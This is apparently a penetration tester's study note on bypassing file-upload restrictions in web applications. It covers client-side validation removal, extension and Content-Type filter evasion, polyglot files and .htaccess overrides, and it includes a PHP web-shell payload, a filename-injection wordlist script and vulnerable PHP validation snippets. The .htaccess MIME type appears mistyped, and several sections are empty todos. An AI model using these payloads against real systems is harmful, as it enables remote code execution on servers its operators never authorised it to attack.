---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/File-Upload/Exploitation
---

# Exploitation

Exploit the file upload functionality to bypass restrictions

___

<!-- Client-Side Validation {{{-->
## Client-Side Validation

Bypass or disable client-side JavaScript validation

<!-- Filename Modification {{{-->
### Filename Modification

Modify the `filename` parameter in the POST Request

1. Upload an intended file

2. Modify `filename` parameter & add payload

```sh
filename="shell.php"
```

```php
<?php system($_REQUEST['cmd']); ?>
```

<!-- Example {{{-->
> [!example]-
>
> ![[burp-filename-modification.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Disable Validation {{{-->
### Disable Validation

Disable JavaScript validation function call

1. Inspect HTML surrounding the upload functionality

<!-- Example {{{-->
> [!example]-
>
> [Page Inspector](https://firefox-source-docs.mozilla.org/devtools-user/page_inspector/):
> Highlight the upload button/profile picture
>
> ![[page-inspector.png]]
>
<!-- }}} -->

2. Identify and remove the JavaScript function called
   from the HTML element to validate the file

<!-- Example {{{-->
> [!example]-
>
> [onchange](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event)
> calls a JavaScript function to validate files
>
> 1. Identify
>
> ```sh
> <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
> ```
>
> ```sh
> onchange="checkFile(this)"
> ```
>
> 2. Disable
>
> ```sh
> onchange=""
> ```
>
> [onsubmit](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit_event)
> calls a JavaScript function to validate files
> within the enclosing `form`
>
> 1. Identify
>
> ```sh
> <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onsubmit="if(validate()){upload()}">
>         <input type="file" name="uploadFile" id="uploadFile" onchange="showImage()" accept=".jpg,.jpeg,.png">
>         <img src="/profile_images/default.jpg" class="profile-image" id="profile-image">
>         <input type="submit" value="Upload" id="submit">
> </form>
> ```
>
> 2. Disable
>
> ```sh
> onsubmit="if(validate()){upload()}"
> ```
>
> ```sh
> onsubmit="upload()"
> ```
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Server-Side Validation {{{-->
## Server-Side Validation

Bypass server-side validation

<!-- Tip - Wordlists {{{-->
> [!tip]- Wordlists
>
> [[Seclists#Web Extensions|Seclists]]
>
<!-- }}} -->

<!-- Extension Filters {{{-->
### Extension Filters

<!-- Blacklist {{{-->
#### Blacklist

Bypass blacklist filters with a valid extension
that is not covered by the blacklist

<!-- Info {{{-->
> [!info]-
>
> The PHP code is taking the file extension (`$extension`)
> from the uploaded file name (`$fileName`)
> and then comparing it against
> a list of blacklisted extensions (`$blacklist`).
>
> ```php
> $fileName = basename($_FILES["uploadFile"]["name"]);
> $extension = pathinfo($fileName, PATHINFO_EXTENSION);
> $blacklist = array('php', 'php7', 'phps');
>
> if (in_array($extension, $blacklist)) {
>     echo "File type not allowed";
>     die();
> }
> ```
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > The blacklist is not comprehensive
> >
> <!-- }}} -->
>
<!-- }}} -->

<!-- Fuzz Extensions {{{-->
##### Fuzz Extensions

Fuzz allowed file extensions

```sh
filename="cat§.png§"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-file-extensions.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Whitelist {{{-->
#### Whitelist

Bypass whitelist filters are testing the file extensions
against a list of allowed file extensions

<!-- Double Extension {{{-->
##### Double Extension

Fuzz double extensions
that are not checked by the whitelist

<!-- Info {{{-->
> [!info]-
>
> The PHP script uses a Regular Expression (*RegEx*)
> to test whether the filename contains
> any whitelisted image extensions
>
> ```sh
> $fileName = basename($_FILES["uploadFile"]["name"]);
>
> if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > RegEx only checks whether the file name contains the extension
> > and not if it actually ends with it
> > ```sh
> > .jpg.php
> > ```
> > ```sh
> > .png.php5
> > ```
> <!-- }}} -->
>
<!-- }}} -->

1. Use a whitelisted first extension

2. Fuzz allowed double extensions

```sh
filename="cat.png§.ext§"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-double-extensions.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Reverse Double Extension {{{-->
##### Reverse Double Extension

Fuzz reverse double extensions
that are not checked by the whitelist

<!-- Info {{{-->
> [!info]-
>
> Apache2's misconfigured `/etc/apache2/mods-enabled/php7.4.conf`
> may allow PHP code execution
>
> ```xml
> <FilesMatch ".+\.ph(ar|p|tml)">
>     SetHandler application/x-httpd-php
> </FilesMatch>
> ```
>
> <!-- Warning {{{ -->
> > [!warning]
> >
> > Files with reverse double extensions may pass the RegEx filter
> > and get executed
> >
> > ```sh
> > .php.jpg
> > ```
> > ```sh
> > .php5.png
> > ```
> <!-- }}} -->
>
<!-- }}} -->

1. Use a whitelisted final extension

2. Fuzz allowed reverse double extensions

```sh
filename="cat§.ext§.jpg"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-reverse-double-extensions.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Character Injection {{{-->
##### Character Injection

Inject special characters
that can cause the web application to misinterpret the filename

<!-- Info {{{-->
> [!info]-
>
> Applications may end parsing the file name after special characters,
> and store the file while passing whitelist
>
> PHP server version `5.X` and earlier end parsing after `%00`
>
> ```sh
> shell.php%00.jpg
> ```
>
> Windows servers may end parsing after `:`
>
> ```sh
> shell.aspx:.jpg
> ```
>
<!-- }}} -->

1. Generate special character permutation wordlist

<!-- Example {{{-->
> [!example]-
>
> Generate all permutations to inject special characters
> before and after both `PHP` and `JPG` extensions
>
> ```sh
> for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
>     for ext in '.php' '.phps'; do
>         echo "shell$char$ext.jpg" >> wordlist.txt  # shell%20.php.jpg
>         echo "shell$ext$char.jpg" >> wordlist.txt  # shell.php%20.jpg
>         echo "shell.jpg$char$ext" >> wordlist.txt  # shell.jpg%20.php
>         echo "shell.jpg$ext$char" >> wordlist.txt  # shell.jpg.php%20
>     done
> done
> ```
>
<!-- }}} -->

2. Fuzz `filename` with injected characters

```sh
filename="§§"
```

<!-- Example {{{-->
> [!example]-
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-character-injection.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Type Filters {{{-->
### Type Filters

Bypass file type filters on the back-end server

<!-- Content-Type {{{-->
#### Content-Type

[[Content-Type]] header validation is set on the back-end
to validate file type

<!-- Info {{{-->
> [!info]-
>
> PHP application Content-Type header test to validate the file type
>
> - `$type`: Set from the uploaded file's Content-Type header
>
> ```sh
> $type = $_FILES['uploadFile']['type'];
>
> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
<!-- }}} -->

<!-- Fuzz Header {{{-->
##### Fuzz Header

Fuzz allowed Content-Type header

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> SecLists
>
> [[Seclists#Content Type|Content-Type]]
>
> Filter content types (*optional*)
>
> ```sh
> cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
> ```
>
<!-- }}} -->

1. Fuzz Content-Type header

```sh
Content-Type §image/jpeg§
```

<!-- Example {{{-->
> [!example]-
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-content-type.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Empty Header {{{-->
##### Empty Header

Bypass type filters using an empty header

<!-- Info {{{-->
> [!info]-
>
> If `Content-Type` is empty or missing
>
> - The filter doesn’t match `image/jpeg` vs `application/php`
> - The backend falls back to default handling
> - The check may not happen
>
<!-- }}} -->

1. Set an empty `Content-Type` header

```sh
Content-Type:
```

<!-- }}} -->

<!-- }}} -->

<!-- MIME-Type {{{-->
#### MIME-Type

[[HTTP/Header/Representation/MIME-Type|MIME-Type]]
validation is set on the back-end to validate file type

<!-- Info {{{-->
> [!info]-
>
> PHP web application MIME type test
>
> ```php
> $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
>
> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
<!-- }}} -->

1. Create polyglot files to bypass MIME-Type validation

<!-- Example {{{-->
> [!example]-
>
> Create a `GIF8` polyglot file
>
> ```sh
> echo "GIF8" > text.jpg
> ```
>
> ![[burp-polyglot.png]]
>
>
<!-- }}} -->

<!-- }}} -->

> [!todo]
>
> - Allowed [MIME-Type] + Disallowed extension
> - Disallowed [MIME-Type] + Allowed extension

<!-- }}} -->

___
<!-- }}} -->



> [!todo]

> [!todo]

> [!todo]

<!-- Htaccess Override {{{-->
# Htaccess Override

Override  [[Apache HTTP Server/General#.htaccess|.htaccess]]
to make [[Apache HTTP Server/General|Apache HTTP Server]]
interpret arbitrary file extensions as `.php`

1. Create `.htaccess` file

```sh
AddType mime-type extension [extension ...]
```

<!-- Example {{{-->
> [!example]-
>
> Execute `.png` extensions as `.php`
>
> ```sh
> echo "AddType application/x-httpd.php .png" > .htaccess
> ```
>
> Execute `.exploit` extensions as `.php`
>
> ```sh
> echo "AddType application/x-httpd.php .exploit" > .htaccess
> ```
>
<!-- }}} -->

2. Upload `.htaccess` to the target

___
<!-- }}} -->

<!-- HTTP Verb Tampering {{{-->
# HTTP Verb Tampering

HTTP verb tampering (e.g., `TRACK`, `PUT`, `MOVE`)

<!-- }}} -->
